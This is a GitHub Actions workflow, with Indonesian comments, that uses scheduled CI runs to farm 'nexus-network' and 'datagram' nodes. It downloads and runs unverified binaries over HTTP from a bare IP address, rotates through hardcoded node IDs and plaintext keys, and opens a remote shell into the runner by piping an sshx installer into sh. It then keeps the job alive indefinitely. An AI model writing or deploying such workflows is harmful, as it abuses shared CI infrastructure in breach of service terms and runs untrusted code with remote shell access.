name: CI Nexus Setup

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'  # Setiap 6 jam

jobs:
  nexus-jobs:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 1

    steps:
      - name: Install Nexus CLI
        run: |
          mkdir -p ~/.nexus/bin
          curl -L "http://103.246.188.56:8000/nexus-network-linux-x86_64" -o ~/.nexus/bin/nexus-network
          curl -L "http://103.246.188.56:8000/datagram" -o ~/.nexus/bin/datagram
          chmod +x ~/.nexus/bin/nexus-network
          chmod +x ~/.nexus/bin/datagram
          ln -sf ~/.nexus/bin/nexus-network ~/.nexus/bin/nexus-cli

      - name: Run 3 Nexus Nodes
        run: |
          # === Daftar pasangan node ID ===
          NODE_PAIRS=(
            "11816937 12893646"
            "11817054 12922855"
            "11817145 12922986"
            "11817168 12945667"
            "12058383 12945675"
            "12058839 12945681"
            "12058896 12945690"
            "12207244 12975174"
            "12207612 12975190"
            "12207615 12975203"
            "12231958 12975210"
            "12258732 12975211"
            "12261078 13007289"
            "12261099 13007298"
            "12323157 13007319"
            "12323609 13007338"
            "12323612 13007344"
            "12323973 13007346"
            "12324083 13007355"
            "12324085 13031941"
            "12324094 13031942"
            "12324174 13031950"
            "12324190 13058915"
            "12386121 13058954"
            "12388478 13058958"
            "12388897 13058959"
            "12403247 13058962"
            "12403262 13058963"
            "12403640 13084979"
            "12403650 13084981"
            "12403768 13085013"
            "12403886 13085023"
            "12403947 13090325"
            "12428785 13115537"
            "12429208 13115569"
            "12429313 13115597"
            "12429438 13145035"
            "12429460 13145037"
            "12458522 13145040"
            "12458682 13145050"
            "12458802 13174192"
            "12484611 13174202"
            "12484674 13174209"
            "12486300 13174225"
            "12487106 13174227"
            "12487242 13174228"
            "12510042 13200708"
            "12510074 13200740"
            "12893600 13200748"
            "12893637 13206874"
          )

          # === Daftar key ===
          KEYS=(
            "472a9a7fa77ecadf2a30c00942f4b522"
            "63a971057fb7a8499ea8238fe5de8b3e"
            "a09c569dad1337c891d63d43496dbaae"
            "ae6e43b60934cca41d2c3e3c3910033a"
            "d8242d6b91814bed5816ca58b4f3c1a7"
            "c23f555a037457b903ef3915705c986f"
            "0dea9aede7e7e8fe00549cf0c96b1809"
            "b9aa09f6c7ade30c674c26b643d9b440"
            "68ba004f34943a55b6665a2632c0a393"
            "18a312da1336f86c18a4f38960bcbcda"
            "61bbc6b42ebcbc4d93dfb6b86673290d"
            "81b6a5215ab9ca1c6d92da0d89267ad0"
            "b5807e3e16f228862637929fb3863d9e"
            "08aa6af3a00b6665195be36b90dd0c70"
            "2cc2ba904fa7ad5b33f3e2a19b13554e"
            "40e79d14e2beb3292943d49deebc6ed1"
          )

          # === Pilih node pair secara acak ===
          RANDOM_NODE_INDEX=$((RANDOM % ${#NODE_PAIRS[@]}))
          SELECTED_PAIR=${NODE_PAIRS[$RANDOM_NODE_INDEX]}
          NODE1=$(echo $SELECTED_PAIR | awk '{print $1}')
          NODE2=$(echo $SELECTED_PAIR | awk '{print $2}')

          # === Pilih key secara acak ===
          RANDOM_KEY_INDEX=$((RANDOM % ${#KEYS[@]}))
          SELECTED_KEY=${KEYS[$RANDOM_KEY_INDEX]}

          echo "Menjalankan node dengan ID: $NODE1 dan $NODE2"
          echo "Menggunakan key: $SELECTED_KEY"

          # === Jalankan node & datagram ===
          screen -dmS nexus-$NODE1 ~/.nexus/bin/nexus-network start --node-id $NODE1
          screen -dmS nexus-$NODE2 ~/.nexus/bin/nexus-network start --node-id $NODE2
          screen -dmS datagram-1 ~/.nexus/bin/datagram run -- -key $SELECTED_KEY

          # Tampilkan session screen
          screen -ls

      - name: Cek RAM & CPU
        run: |
          echo "CPU Info:"
          lscpu
          echo "Memory Info:"
          free -h
          echo "Task Manager:"
          ps aux
          curl -sSf https://sshx.io/get | sh -s run > sshx.log &
          sleep 3
          cat sshx.log

      - name: Keep session alive
        run: sleep infinity

